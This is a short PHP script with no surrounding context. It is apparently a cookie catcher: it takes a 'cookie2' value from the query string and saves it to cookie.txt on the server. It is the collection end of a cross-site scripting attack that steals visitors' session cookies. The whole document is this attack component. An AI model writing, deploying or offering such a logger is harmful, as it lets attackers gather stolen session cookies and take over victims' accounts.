<?php
$cookie=$_GET[cookie2];
$save=fopen("./cookie.txt","w");
fwrite($save, $cookie);
fclose($save);
?>
